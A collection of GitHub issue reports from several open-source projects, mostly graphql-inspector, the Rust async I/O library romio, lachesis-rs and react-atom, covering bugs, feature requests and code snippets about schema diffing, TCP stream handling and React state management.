It would be useful to have some documentation on how to run Rust-based Lambda functions locally, for development & testing purposes. In [a precursor project there was this question](https://github.com/srijs/rust-aws-lambda/issues/28) about using Rust with Lambda@Edge (Lambda + CloudFront).
It looks like Lambda@Edge is [still limited to nodejs](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/lambda-requirements-limits.html#lambda-requirements-lambda-function-configuration).  Any idea if Amazon plans to expand supported runtimes?  Or, worst-case, is there any interest in this runtime to work via nodejs?

<---------->
157776824
Hi, I tried to use graphql-inspector cli to validate two authenticated graphql servers. My servers are using authentication via bearer token and I didn`t find anyway I can pass custom headers to my requests (just found --token option that only works for github). Would be awesome have this feature. Thanks I saw you created https://github.com/kamilkisiela/graphql-inspector/blob/master/Dockerfile-cli and have also set up a repository at https://hub.docker.com/r/kamilkisiela/graphql-inspector

Can you publish the CLI image there? It is quite simple to set up an automated build with Docker Hub.

Thanks It seems that coverage throws error if the query contains the field `__typename` in the following line:
https://github.com/kamilkisiela/graphql-inspector/blob/e87c322703f305323cff947a156a5709877978c7/packages/core/src/coverage/index.ts#L66

Do you think it is OK to simple ignore it? We have a modularized server with several `.graphql` files. If I understand correctly from the discussion in #250 it should be possible to do the following workaround (with glob):
```
graphql-inspector introspect path/to/files/**/*.graphql --write schema.graphql
```
In order to get one big schema file.

This makes sense to me, since the `graphql-toolkit` is used to load the schema:
https://github.com/kamilkisiela/graphql-inspector/blob/e87c322703f305323cff947a156a5709877978c7/packages/load/src/schema/index.ts#L2

However the workaround does not work; and it is weird because if I use the `graphql-toolkit` directly, I get the "merge" schema. Please check the codesandbox here:

[![Edit graphql-inspector-glob-introspect](https://codesandbox.io/static/img/play-codesandbox.svg)](https://codesandbox.io/s/graphql-inspector-glob-introspect-ei5jv?fontsize=14)

The `graphql-inspector` seems to get only the first file and not the "merged" schema from the `graphql-tookit`. Can you please clarify if it should be possible to use glob pattern with the `introspect` command of the cli?

Thanks! Comparing GraphQL schemas via 
`graphql-inspector diff old-version.graphql new-version.graphql `  

results in a message

`error Unable to find any GraphQL type defintions for the following pointers: new-version.graphql`

in case the file 'new-version.graphql' contains an empty type definition.

I.e. in case 'old-version.graphql' contains the content

```
type PERSON {
  name: String
}
```

and 'new-version.graphql' contains content:

```
type PERSON {
  name: String
}

type ADRESS {
}
```

I guess the expected output would be a message that type 'ADRESS' has been added but that no breaking changes have been detected. We have a modularized server with several `.graphql` files. If I understand correctly from the discussion in #250 it should be possible to do the following workaround (with glob):
```
graphql-inspector introspect path/to/files/**/*.graphql --write schema.graphql
```
In order to get one big schema file.

This makes sense to me, since the `graphql-toolkit` is used to load the schema:
https://github.com/kamilkisiela/graphql-inspector/blob/e87c322703f305323cff947a156a5709877978c7/packages/load/src/schema/index.ts#L2

However the workaround does not work; and it is weird because if I use the `graphql-toolkit` directly, I get the "merge" schema. Please check the codesandbox here:

[![Edit graphql-inspector-glob-introspect](https://codesandbox.io/static/img/play-codesandbox.svg)](https://codesandbox.io/s/graphql-inspector-glob-introspect-ei5jv?fontsize=14)

The `graphql-inspector` seems to get only the first file and not the "merged" schema from the `graphql-tookit`. Can you please clarify if it should be possible to use glob pattern with the `introspect` command of the cli?

Thanks!  hi,

is this similar logic to graphql lib?
https://github.com/graphql/graphql-js/blob/master/src/utilities/findBreakingChanges.js

thanks,
shane  Hello there and thanks for the awesome tool!

I was trying to use `graphql-inspector serve` on my local application as a way of doing a layman's chaos testing session. To get it to work I had to go into the bundled code and change:

```javascript
headers: options.headers,
```

to this:

```javascript
headers: { ...options.headers, 'Access-Control-Allow-Origin': '*' },
```

The variable being called `options` makes me thing it's configurable via the programmatic `@graphql-inspector/core`, but I think it should be possible to set it via CLI too.

What do you think? So many of you are working with GraphQL Inspector App  I sometimes want to drop deprecated fields which are no longer in use. 

I'd like to have a switch for ignoring removals on deprecated fields, so that i.e. removing a non-deprecated field is considered a breaking change, but removing a deprecated field (possibly after a certain date) is not bad.

I'm not sure this is related to #215.  

I may be able to take a stab at this if it's considered a valuable thing. Hi,
When validating schema I'm getting errors about [`@connection`](https://www.apollographql.com/docs/react/features/pagination#connection-directive) directive:
```
- Unknown directive connection.
```
Is there a way to allow usage of custom directives in documents? Hello,

I have a running client that consume a GraphQL service. I can query without any issue. I am trying to use the graphql-inspector but this one keeps saying:

> was filtered because it contains an invalid GraphQL schema definition

I am using:

`./node_modules/.bin/graphql-inspector validate ./src/**/*.{ts,tsx} ./graphql/allSchema.graphql`

and the result is 

>File "./src/Shared/ContainerComponents/GraphQLExperimentation1.tsx" was filtered because it contains an invalid GraphQL schema definition!
File "./src/Shared/ContainerComponents/GraphQLExperimentation2.tsx" was filtered because it contains an invalid GraphQL schema definition!

>error All found files for glob expression "./src/**/*.tsx" are not valid or empty, please check it and try again!

It would be helpful to know what "invalid" means? Meanwhile, is there an option to get further detail because from my perspective the schema is valid. The VSCode extension (GraphQL for VSCode) uses the static file `./graphql/allSchema.graphql` and does not detect any issue. The execution of the query is also flawless.

The two .tsx files are different. The first one uses:

 ```
const result: ApolloQueryResult<Proto.Query> = await this.client.query<Proto.Query>({
 query: gql`
                    query Proto {
                        entityA(id: 1) {
                            name
                            id
                        }
                    }
                `
         });
```

The second one use:

```
<Query
    query={gql`
        query Proto2 {
            entityA(id: 1) {
                name
                id
            }
        }
    `}
>
```

Thank you in advance.
 Whenever the schema has an empty type, like
```
type Car {

}
```
The inspector throws:

`error Must provide Source. Received: {}`

Is this the expected behavior?  Could you please provide an executable sample node project that demo how to use the API?  hi,

i am trying to generate the schema to be used for diffing.

logic as so
schema.ts
```
import { resolvers, typeDefs } from './server/schema';
import { makeExecutableSchema } from 'apollo-server-koa';

export const schema = makeExecutableSchema({ typeDefs, resolvers });

```

my yarn script is 

```
    "graphql:dump": "npx graphql-inspector introspect src/schema.ts --write schema.graphql --require ts-node/register",

```

the problem is when i look at the output, its missing all my queries and mutations.

I have a modularised schema.

When i look at the schema file it has for example:
```
type Mutation {
  _: Boolean
}

type Query {
  _: Boolean
}
```

this is different from playground when i down via apollo-cli

```
 "graphql:dump-schema": "apollo schema:download --endpoint=http://localhost:8081/graphql schema.json"
```

it looks like

```

type Query {
  _: Boolean
  job(positionId: ID!): Job
  version: String
  prospects(
    positionId: ID
    bucket: Bucket
    sort: Sort
    sortOrder: SortOrder
  ): Prospects!
  prospectsByIds(ids: [ProspectsByIdsFilter]): Prospects!
  prospectEmails(prospectId: ID!, candidateId: ID!): ProspectEmails!
  prospectNotes(prospectId: ID!): ProspectNotes!
  notes(prospectId: ID!): ProspectNotes!
}

type Mutation {
  _: Boolean
  sendProspectEmail(
    prospectId: ID!
    subject: String!
    message: String!
    enableReplies: Boolean!
  ): ProspectEmail!
  sendBulkProspectEmail(
    input: SendBulkProspectEmail!
  ): SendBulkProspectEmailPayload!
  createProspectNote(prospectId: ID!, content: String!): ProspectNote!
  removeProspectNote(prospectId: ID!, noteId: ID!): ProspectNote!
  updateProspectRating(
    input: UpdateProspectRatingInput!
  ): ProspectRatingPayload!
  updateStatusForProspects(
    input: UpdateStatusForProspectsInput!
  ): UpdateStatusForProspectsPayload!
}
```

how do i get the full blown schema??

thanks,
shane.
 hi,

is this similar logic to graphql lib?
https://github.com/graphql/graphql-js/blob/master/src/utilities/findBreakingChanges.js

thanks,
shane So it rendered schema diff etc
<---------->
157896792
## Refs
- https://github.com/rust-lang-nursery/futures-rs/issues/1352
- https://github.com/withoutboats/romio/search?q=futureobj&unscoped_q=futureobj ## Refs
- https://github.com/rust-lang-nursery/futures-rs/issues/1352
- https://github.com/withoutboats/romio/search?q=futureobj&unscoped_q=futureobj * rustc 1.35.0-nightly (cb2f34dc6 2019-03-22)
* romio-0.3.0-alpha.3
I am writing a proxy software, in the CopyInto poll interface, the data is read from the socket of the connection server, and then the received data is written to the socket connected to receiving end.
From the log collected locally, after the time point of 16:16:15:3796373, the future seems to be asleep, until after 5 minutes, it is awakened by the receiving end rst message.
From the data collected by the server-side tcpdump, the data is normally sent, but the client does not read the data in time, causing the socket to be full.
What is the problem that causes the buffer to have data but the future is not awakened. Is there any problem with my code?
The actual code logic starts at line 51: https://gist.github.com/SiMaCuo/f7317c8e279bcc7b2ff489434464b5ea
repo: https://github.com/SiMaCuo/ss-local
I am very grateful for any suggestions.
Sorry, my english is poor.
![微信图片_20190403232139](https://user-images.githubusercontent.com/16982243/55490999-4d4ca680-5667-11e9-8584-9449c69e0bc7.png)

![微信图片_20190403234556](https://user-images.githubusercontent.com/16982243/55493199-1bd5da00-566b-11e9-9159-5fbb0ac2a7f8.png)
 Is there any client/server openssl example using `romio`? Can we get a new release on crates.io?

I'm seeing some deadlocks occasionally happen in some of my tests with romio version `0.3.0-alpha.9`: https://github.com/capnproto/capnproto-rust/blob/15163beb08b3efc31ec94f0fd1b704a60489726f/capnp-rpc/test/Cargo.toml

The deadlock does not happen with the latest git version of romio.

This is the commit that made the deadlock go away: https://github.com/withoutboats/romio/commit/2caa8d6716fea2400d0586dee74fe0c9e0cc787b

My guess is that the `parking_lot` update is responsible. That crate's changelog does indicate that there have been some relevant-looking bugfixes between `0.7.1` and `0.9.0`: https://github.com/Amanieu/parking_lot/blob/master/CHANGELOG.md

 Can we get a new release on crates.io?

I'm seeing some deadlocks occasionally happen in some of my tests with romio version `0.3.0-alpha.9`: https://github.com/capnproto/capnproto-rust/blob/15163beb08b3efc31ec94f0fd1b704a60489726f/capnp-rpc/test/Cargo.toml

The deadlock does not happen with the latest git version of romio.

This is the commit that made the deadlock go away: https://github.com/withoutboats/romio/commit/2caa8d6716fea2400d0586dee74fe0c9e0cc787b

My guess is that the `parking_lot` update is responsible. That crate's changelog does indicate that there have been some relevant-looking bugfixes between `0.7.1` and `0.9.0`: https://github.com/Amanieu/parking_lot/blob/master/CHANGELOG.md

 * rustc 1.35.0-nightly (cb2f34dc6 2019-03-22)
* romio-0.3.0-alpha.3
I am writing a proxy software, in the CopyInto poll interface, the data is read from the socket of the connection server, and then the received data is written to the socket connected to receiving end.
From the log collected locally, after the time point of 16:16:15:3796373, the future seems to be asleep, until after 5 minutes, it is awakened by the receiving end rst message.
From the data collected by the server-side tcpdump, the data is normally sent, but the client does not read the data in time, causing the socket to be full.
What is the problem that causes the buffer to have data but the future is not awakened. Is there any problem with my code?
The actual code logic starts at line 51: https://gist.github.com/SiMaCuo/f7317c8e279bcc7b2ff489434464b5ea
repo: https://github.com/SiMaCuo/ss-local
I am very grateful for any suggestions.
Sorry, my english is poor.
![微信图片_20190403232139](https://user-images.githubusercontent.com/16982243/55490999-4d4ca680-5667-11e9-8584-9449c69e0bc7.png)

![微信图片_20190403234556](https://user-images.githubusercontent.com/16982243/55493199-1bd5da00-566b-11e9-9159-5fbb0ac2a7f8.png)
 This is very similar to https://github.com/tokio-rs/tokio/issues/852.

Running the following test program hangs and doesn't notice that the client has closed the write side of the `TcpStream`:

```rust
#![feature(futures_api, async_await, await_macro)]

use std::{io, net::IpAddr};

use futures::{StreamExt, io::{AsyncReadExt, AsyncWriteExt}};
use romio::TcpListener;
use romio::TcpStream;

fn main() {
    futures::executor::block_on(async {
        let ip: IpAddr = "127.0.0.1".parse().unwrap();
        let mut listener = TcpListener::bind(&(ip, 0).into()).unwrap();

        let port = listener.local_addr().unwrap().port();

        let mut incoming = listener.incoming();
        let (_rx, mut tx) = await!(TcpStream::connect(&(ip, port).into())).unwrap().split();
        let (mut rx, _tx) = await!(incoming.next()).unwrap().unwrap().split();

        println!("Connection established");

        println!("Closing tx");
        await!(tx.close()).unwrap();

        println!("Wait for server to notice connection was closed...");
        let mut byte = [0];
        let res = await!(rx.read_exact(&mut byte));
        assert!(res.is_err());
        assert_eq!(res.unwrap_err().kind(), io::ErrorKind::UnexpectedEof);
    })
}
```

By adding in a wrapper around the clients `TcpStream` that implements `poll_close` to call `shutdown(Shutdown::Write)` the server notices that the client has closed the TCP connection

```rust
struct Fix(TcpStream);

impl AsyncRead for Fix {
    fn poll_read(&mut self, waker: &Waker, buf: &mut [u8]) -> Poll<io::Result<usize>> {
        self.0.poll_read(waker, buf)
    }
}

impl AsyncWrite for Fix {
    fn poll_write(&mut self, waker: &Waker, buf: &[u8]) -> Poll<io::Result<usize>> {
        self.0.poll_write(waker, buf)
    }

    fn poll_flush(&mut self, waker: &Waker) -> Poll<io::Result<()>> {
        self.0.poll_flush(waker)
    }

    fn poll_close(&mut self, waker: &Waker) -> Poll<io::Result<()>> {
        ready!(self.poll_flush(waker)?);
        Poll::Ready(self.0.shutdown(std::net::Shutdown::Write))
    }
}
```

For some reason in the linked Tokio issue they don't want to apply this change to `TcpStream` itself, I can't see any reason not to just change it though. Currently, the `reactor` module is private in `lib.rs`, it is therefore not possible to pass a custom `Evented` implementation into Romio using `PollEvented`.

`PollEvented` should be publicly accessible, like it is in Tokio. Today, I upgraded the related items to the following versions:
        Romio-0.3.0-alpha.6
        Futures alpha 15
        Rustc 1.36.0-nightly (d595b1135 2019-05-10)
Get some compilation errors that I can't solve myself:
![image](https://user-images.githubusercontent.com/16982243/57564280-0a0af380-73dc-11e9-9a04-87049e2211d5.png)
I am grateful for any suggestions. Hi there,

I read through some of the other issues on timers in `romio`, but it seemed slightly different than changing the underlying `mio/net2` timing settings. I want to open a large number of TCP connections to different hosts, which may or may not respond. In order to prevent an excessive number of open files on the host I want to configure aggressive connection timeouts to prune connections that don't respond quickly. 

I'd be happy to try to submit a PR to add a `Builder` object or something to make `TcpStream` more configurable, but I'm not sure if there is somewhere I should be looking for an example of this. (I'm digging into the Rust async/await story, and I'm not experienced in it yet.) 

Here's a brief snippet that shows the code I'm using -- I appear to be hanging onto connections that fail for some time, and if there is an alternate path to fix I'd be happy to try that out instead. 

```rust
fn main() -> io::Result<()> {
    let delay = 1e9 as u64 / REQUESTS_PER_SECOND;

    executor::block_on(async {

        for _ in 0..TOTAL_REQUESTS {
            juliex::spawn(async move {
                let addr = random_addr(80);
                match TcpStream::connect(&addr.into()).await {
                    Ok(mut stream) => {
                        stream.write_all(&REQUEST)
                            .await
                            .expect("Failed to write to socket"); // todo: Handle partial success

                        stream.close()
                            .await
                            .expect("Failed to close socket");

                        println!("Success: {:?}", &addr);
                    }
                    Err(e) => {
                        eprintln!("Failed to connect: '{}'", e);
                    }
                }

            });

            thread::sleep(Duration::from_nanos(delay));
        }
    });

    Ok(())
}
```

Thanks!
Ryan I am having problems setting read timeout on the UdpSocket.

I can set timeout on a mio::net::UdpScoket, but can't transfer that using UdpSocket::new() since the method is private.

Neither can i do let socket_rx = UdpSocket{ io: PollEvented::new(msocket) }; - since the ractor::PollEvented is also private.

Is there a way around this, or does it require a code change ? This library  doesn't look  active, Can it be move to [Rustasync organization](https://github.com/rustasync). It may will be better for it As talked with @withoutboats about: it would make sense to create a timer implementation on top of OS timers. I'm not quite sure yet how this should work, but a cursory search shows that there's multiple options available on unix through `timer_create(2)` and `epoll(2)` with a timeout parameter. I'm not sure yet about Windows.

## References
- https://stackoverflow.com/questions/7845817/asynchronous-timer-in-linux Whenever I do `cargo test`, I do get the following output: 

```
   Compiling futures-util-preview v0.3.0-alpha.10
error[E0599]: no function or associated item named `get_unchecked_mut` found for type `std::pin::Pin<_>` in the current scope
  --> /Users/zaharidichev/.cargo/registry/src/github.com-1ecc6299db9ec823/futures-util-preview-0.3.0-alpha.10/src/future/map.rs:19:5
   |
19 |     unsafe_unpinned!(f: Option<F>);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ function or associated item not found in `std::pin::Pin<_>`
   |
   = help: did you mean `map_unchecked_mut`?
   = note: this error originates in a macro outside of the current crate (in Nightly builds, run with -Z external-macro-backtrace for more info)
```

Env:
rustc 1.33.0-nightly (adbfec229 2018-12-17)
cargo 1.33.0-nightly (2cf1f5dda 2018-12-11)

Is something broken at the moment or the problem is with my environment ?  I was trying out romio and started by using the echo server example from [juliex][juliex]. I expected that connecting more than one client would result in both of them getting responses to the messages being sent to them, but instead only one of the clients was getting a response back while the other did not. Once the first client was disconnected, the messages started coming back one line after the other. 

I have a [screen capture][capture] of the same and you can reproduce the issue by cloning the [project repository][repo], going into the `rustlb` directory and running the server using `cargo run --bin origin` and then connecting to it using `nc localhost 7878` from two different terminals.

You should only receive messages echod back on the first client to connect while the second will accept input, but get responses one line after the other only after the first client has disconnected.

I tested this further, by connecting a third client and looks like there is a sequence in which the messages are processed. The second client to connect receives messages back once the first client has disconnected and the third client receives messages back after the second one has.

[juliex]: https://github.com/withoutboats/juliex/blob/master/examples/echo.rs
[capture]: https://streamable.com/b2shg
[repo]: https://github.com/chicagohaskell/async-futures-talk I was trying out romio and started by using the echo server example from [juliex][juliex]. I expected that connecting more than one client would result in both of them getting responses to the messages being sent to them, but instead only one of the clients was getting a response back while the other did not. Once the first client was disconnected, the messages started coming back one line after the other. 

I have a [screen capture][capture] of the same and you can reproduce the issue by cloning the [project repository][repo], going into the `rustlb` directory and running the server using `cargo run --bin origin` and then connecting to it using `nc localhost 7878` from two different terminals.

You should only receive messages echod back on the first client to connect while the second will accept input, but get responses one line after the other only after the first client has disconnected.

I tested this further, by connecting a third client and looks like there is a sequence in which the messages are processed. The second client to connect receives messages back once the first client has disconnected and the third client receives messages back after the second one has.

[juliex]: https://github.com/withoutboats/juliex/blob/master/examples/echo.rs
[capture]: https://streamable.com/b2shg
[repo]: https://github.com/chicagohaskell/async-futures-talk As of rustc 1.34.0-nightly (146aa60f3 2019-02-18), Wake, local_waker, local_waker_from_nonlocal is removed from std, which breaks romio's master branch. We use the deprecated `ATOMIC_USIZE_INIT` but we should use `AtomicUsize::new(0)` We use the deprecated `ATOMIC_USIZE_INIT` but we should use `AtomicUsize::new(0)`
<---------->
157982968
We need a tester similar one in lachesis-go (https://github.com/Fantom-foundation/go-lachesis/tree/master/tester ) which sends a specified number of transactions to a lachsesis network. This is very helpful in debugging lachesis. Current Lachesis implementation in Go uses FNV hash function to calculate EventHash, https://golang.org/pkg/hash/fnv/ ; but Rust has replaced FNV hash as its default hash function by a faster hash function, https://github.com/rust-lang/rust/pull/37229

To make lachesis-rs compatible with go implementation we need to use the very same hash function for event hashes. See https://github.com/servo/rust-fnv for fnv hash implementation in Rust. Add a pool to hold transaction submitted via HTTP(#33)

The status of a transaction should be queryable via HTTP(#33)

Transactions in the pool should be propagated through the network via the consensus protocol.
 That is: Travis, configure rustfmt and clippy, create a nice README, etc. Currently EventHash and EventSignature are ```Vec<u8>```. ```[u8; 4]``` is more performant and has better type safety. See https://github.com/Fantom-foundation/lachesis-rs/blob/64b12dce871e4b1d23a17440a066995672bd96e9/lachesis-rs/src/swirlds.rs#L186 Move to rust 2018 module structure

- It is intuitive
- It is the new standard

https://rust-lang-nursery.github.io/edition-guide/rust-2018/module-system/path-clarity.html See https://travis-ci.org/Fantom-foundation/lachesis-rs/builds/482648462?utm_source=github_status&utm_medium=notification Each square refers to a repository:
![lachesis-new-arch](https://user-images.githubusercontent.com/807580/56877073-dac8be00-6a8e-11e9-8fc8-1bef2e1c226c.png)

Can have more repositories than this also. Integrate actix into the codebase and utilise the actor model to manage concurrency Currently EventHash and EventSignature are Vec<u8>. [u8; 4] will be more performant and type safe. The current tcp-client crate is not a client, it a node. It should should be moved into lachesis-rs under the bin folder.

The tcp-client crate should be a command line utility to communicate to a Lachesis node via TCP. We need a HTTP server than provides endpoints to submit transaction and query transaction information. I think this is somewhat urgent as we need this functionality to test the network.

The HTTP server should run in-process. I think we should use an async runtime library (tokio-rs, actix) for the HTTP server. We can use the same runtime for sending/receiving internode synchronisation messages. If you search for `unwrap` in the code basis, you will find far too many.
Unwraps make sense only in main functions.

In most places, they are present inside closures used in helper functions of iterators. In those cases, they should be replaced by first a map that changes `Iterator<T>` to `Iterator<Result<T, Error>>` and then a collect to transform it to `Result<Vec<T>, Error>`.

In the demo binaries, instead of unwrap, we should log the error and continue iterating. Implement websockets using Actix-web.

Websockets can be used for inter-node communication or for clients wishing to subscribe to network updates.

For the time being bincode will continue to be used for encoding. We should remove the swirls/hashgraph code as we are no longer using it
<---------->
158061307
It would be nice not to have to spread state all over the place in `swap`, like this:

```js
swap(atom, (state) => ({
  ...state,
  stuff: {
    ...state.stuff,
    things: [...state.stuff.things, newThing]
  }
})
```

and instead be able to do this:

```js
swap(atom, (state) => ({
  stuff: {
    things: [...state.stuff.things, newThing]
  }
})
```

`swap` would still work if you manually spread things like now, and we could avoid unnecessary deep merging by just checking `Object.is` between the old and new state and just skip merging those that are equal. Dependabot encountered the following error when parsing your `.dependabot/config.yml`:

```
Automerging is not enabled for this account. You can enable it from the [account settings](https://app.dependabot.com/accounts/derrickbeining/settings) screen in your Dependabot dashboard.
```

Please update the config file to conform with Dependabot's specification using our [docs](https://dependabot.com/docs/config-file/) and [online validator](https://dependabot.com/docs/config-file/validator/). A project using `react-atom 4.1.1` with dependency on `react-dom 16.9.0` results in a warning during `npm install`:

    @dbeining/react-atom@4.1.1 requires a peer of react-dom@>=16.7.0-alpha.0 || >=16.8.0-alpha.0 || ^16.8.x but none is installed. You must install peer dependencies yourself. This is a neat library, and I want to try it. But here is one thing i haven't figure it out. If effects takes `Atom` argument, a bunch of effects need to be wrapped in `useCallback` like `memoIncrement` below.

```typescript
import * as React from "react";
import { useAtom, Atom, swap } from "@dbeining/react-atom";


export type AppState = Atom<{
  count: number;
  text: string;
  data: any;
}>;


// effects
export const increment = (stateAtom: AppState) =>
  swap(stateAtom, state => ({ ...state, count: state.count + 1 }));

export const decrement = (stateAtom: AppState) =>
  swap(stateAtom, state => ({
    ...state,
    count: state.count && state.count - 1
  }));

export const updateText = (
  stateAtom: AppState,
  evt: React.ChangeEvent<HTMLInputElement>
): void => swap(stateAtom, state => ({ ...state, text: evt.target.value }));

export const loadSomething = (stateAtom: AppState) =>
  fetch("https://jsonplaceholder.typicode.com/todos/1")
    .then(res => res.json())
    .then(data => swap(stateAtom, state => ({ ...state, data })))
    .catch(console.error);

const AppContext = React.createContext<AppState | undefined>(undefined);

export const App = () => {
  const stateAtom = React.useRef(
    Atom.of({
      count: 0,
      text: "",
      data: {}
    })
  );

  console.log("App render()");

  return (
    <AppContext.Provider value={stateAtom.current}>
      <Child />
    </AppContext.Provider>
  );
};

export function Child() {
  const stateAtom = React.useContext(AppContext);
  const { count, data, text } = useAtom(stateAtom);

  const memoIncrement = React.useCallback(
    ev => {
      increment(stateAtom);
    },
    [stateAtom]
  );

  return (
    <div>
      <h2>Count: {count}</h2>
      <h2>Text: {text}</h2>

      <button onClick={memoIncrement}>Moar</button>
      <button onClick={ev => decrement(stateAtom)}>Less</button>
      <button onClick={ev => loadSomething(stateAtom)}>Load Data</button>
      <input
        type="text"
        onChange={ev => updateText(stateAtom, ev)}
        value={text}
      />
      <p>{JSON.stringify(data, null, "  ")}</p>
    </div>
  );
}

``` Hi!

Thank you for maintaining such a good lib! I wondered if somebody implemented something like an atom in Clojure and I'm here!

**UPD:** 
Probably I should address this question to @libre/atom, but I'll leave it here for now.

I'm playing with it and thinking about using it in my TypeScript project but I'm curious why I'm not receiving any TS error when trying to swap state to something, that doesn't match its initial shape. 
For example:

```
export interface AppState {
    isLoading: Boolean
}

export const appState = Atom.of<AppState>({
    isLoading: false,
})

export const setIsLoading = (isLoading: boolean) =>
    swap<AppState>(appState, (state) => ({
        ...state,
        foo: 0, // No error here
        isLoading,
    }))
```

Am I doing something wrong?

Thank you in advance! A project using `react-atom 4.1.1` with dependency on `react-dom 16.9.0` results in a warning during `npm install`:

    @dbeining/react-atom@4.1.1 requires a peer of react-dom@>=16.7.0-alpha.0 || >=16.8.0-alpha.0 || ^16.8.x but none is installed. You must install peer dependencies yourself. Hi!

Thank you for maintaining such a good lib! I wondered if somebody implemented something like an atom in Clojure and I'm here!

I'm playing with it and thinking about using it in my TypeScript project but I'm curious why I'm not receiving any TS error when trying to swap state to something, that doesn't match its initial shape. 
For example:

`export interface AppState {
    isLoading: Boolean
}

export const appState = Atom.of<AppState>({
    isLoading: false,
})

export const setIsLoading = (isLoading: boolean) =>
    swap<AppState>(appState, (state) => ({
        ...state,
        foo: 0, // No error here
        isLoading,
    }))
`

Am I doing something wrong?

Thank you in advance! This is a neat library, and I want to try it. But here is one thing i haven't figure it out. If effects takes `Atom` argument, a bunch of effects need to be wrapped in `useCallback` like `memoIncrement` below.

```typescript
import * as React from "react";
import { useAtom, Atom, swap } from "@dbeining/react-atom";


export type AppState = Atom<{
  count: number;
  text: string;
  data: any;
}>;


// effects
export const increment = (stateAtom: AppState) =>
  swap(stateAtom, state => ({ ...state, count: state.count + 1 }));

export const decrement = (stateAtom: AppState) =>
  swap(stateAtom, state => ({
    ...state,
    count: state.count && state.count - 1
  }));

export const updateText = (
  stateAtom: AppState,
  evt: React.ChangeEvent<HTMLInputElement>
): void => swap(stateAtom, state => ({ ...state, text: evt.target.value }));

export const loadSomething = (stateAtom: AppState) =>
  fetch("https://jsonplaceholder.typicode.com/todos/1")
    .then(res => res.json())
    .then(data => swap(stateAtom, state => ({ ...state, data })))
    .catch(console.error);

const AppContext = React.createContext<AppState | undefined>(undefined);

export const App = () => {
  const stateAtom = React.useRef(
    Atom.of({
      count: 0,
      text: "",
      data: {}
    })
  );

  console.log("App render()");

  return (
    <AppContext.Provider value={stateAtom.current}>
      <Child />
    </AppContext.Provider>
  );
};

export function Child() {
  const stateAtom = React.useContext(AppContext);
  const { count, data, text } = useAtom(stateAtom);

  const memoIncrement = React.useCallback(
    ev => {
      increment(stateAtom);
    },
    [stateAtom]
  );

  return (
    <div>
      <h2>Count: {count}</h2>
      <h2>Text: {text}</h2>

      <button onClick={memoIncrement}>Moar</button>
      <button onClick={ev => decrement(stateAtom)}>Less</button>
      <button onClick={ev => loadSomething(stateAtom)}>Load Data</button>
      <input
        type="text"
        onChange={ev => updateText(stateAtom, ev)}
        value={text}
      />
      <p>{JSON.stringify(data, null, "  ")}</p>
    </div>
  );
}

``` I am using react-atom in multiple projects, often starting with `React.useState()` then upgrading to atoms. The `useAtomState()` hook below makes it take only a few keystrokes to replace `useState` with a react-atom. It has the same return signature as `useState` but takes an Atom. 

Perhaps it could be added to the distribution? It would make it (even) easier for React devs to start using react-atom and upgrade their existing react hook codebase.

```javascript
function useAtomState (atom) {
  const state = useAtom(atom);
  const setState = useCallback ((obj) => {
    swap(atom, (typeof obj === 'function') ? obj : () => obj)
  }, [atom]);
  return ([state, atom ? setState : null]);
}
``` Hey @derrickbeining, I've been playing around with your library and I really like the api! I think it should be added to the [usehooks](https://github.com/gragland/usehooks) page to increase its visibility. Dependabot encountered the following error when parsing your `.dependabot/config.yml`:

```
Automerging is not enabled for this account. You can enable it from the [account settings](https://app.dependabot.com/accounts/derrickbeining/settings) screen in your Dependabot dashboard.
```

Please update the config file to conform with Dependabot's specification using our [docs](https://dependabot.com/docs/config-file/) and [online validator](https://dependabot.com/docs/config-file/validator/). Hey @derrickbeining, I've been playing around with your library and I really like the api! I think it should be added to the [usehooks](https://github.com/gragland/usehooks) page to increase its visibility. In the code below, k can be invalidated if a previous call to changeHandlersByAtomId causes a component to unmount farther down the list. 

```
function _runChangeHandlers(atom, previous, current) {
  Object.keys(changeHandlersByAtomId[atom["$$id"]]).forEach(function (k) {
    changeHandlersByAtomId[atom["$$id"]][k]({
      previous: previous,
      current: current
    });
  });
}
``` Having a code base that has both hook based and class based components is common. It would be useful for `react-atom` to provide a HOC for these components. Something simple like the following should work.

    const connect = (mapStateToProps, store) => Component => props => {
      const stateProps = mapStateToProps(useAtom(store))
      return <Component {...stateProps} {...props} />
    } In the code below, k can be invalidated if a previous call to changeHandlersByAtomId causes a component to unmount farther down the list. 

```
function _runChangeHandlers(atom, previous, current) {
  Object.keys(changeHandlersByAtomId[atom["$$id"]]).forEach(function (k) {
    changeHandlersByAtomId[atom["$$id"]][k]({
      previous: previous,
      current: current
    });
  });
}
``` Hi @derrickbeining - great project you got here!

I've been using React Waterflow earlier on (as a replacement for Redux et al.) and I like what you did. Actually, I like it so much, that I converted / introduced only your package for global state management in all recent projects I'm involved in. The only thing that I like more about React Waterflow is the possibility of adding the (very mature / advanced) Redux dev tools.

For me the most important / crucial part about the Redux dev tools was the console logging during development / non-production runtime. So I thought "why not try to re-create that experience". All in all I did not write any compatibility layer, but rather just a lightweight console output.

The code is:

```js
addChangeHandler(globalState, 'debugging', ({ current, previous }) => {
    const action = new Error().stack.split('\n')[6].replace(/^\s+at\s+Atom\./, '');
    console.group(
    `%c Portal State Change %c ${new Date().toLocaleTimeString()}`,
    'color: gray; font-weight: lighter;',
    'color: black; font-weight: bold;',
    );
    console.log('%c Previous', `color: #9E9E9E; font-weight: bold`, previous);
    console.log('%c Action', `color: #03A9F4; font-weight: bold`, action);
    console.log('%c Next', `color: #4CAF50; font-weight: bold`, current);
    console.groupEnd();
});
```

where `globalState` is the created `globalState`. You can see the whole source code / repository [here](https://github.com/smapiot/piral/blob/master/packages/piral-core/src/state/createGlobalState.ts). We placed this code in a conditional to avoid placing the code in the production build.

Maybe you / someone find(s) this snippet useful and we could provide it as a utility out of the box (properly exported such that tree shaking can remove it if not being used, e.g., in a PROD build of the consuming application).

Thanks again for your nice lib - great job! :beers:
<---------->
158212031
My girlfriend suggested the below:
- Paperless, almost every high school now gives students laptops or ipads, we can make something like google docs and integrate with our system.
- Parents, we should get parents involved in the system too, that way students won't be able to lie to their parents about their scores. And it is easier for parents and teachers to communicate.
- Attendance, in a lot of high schools, teachers have one attendance book for one class, so usually they carry around like a few of these books and its messy if they get confused and use the wrong book. We can automate it and can send notification to both teachers and parents if student is absent.

<---------->
158291935
   Read assign and read variables in a graph (ReadVariableOp)  Read assign and read variables in a graph (ReadVariableOp) Thoughts here....
Carddatamanager needs to take in all the cards possible, Not just the two decklists.
It needs to be abstracted from the engine and passed in.
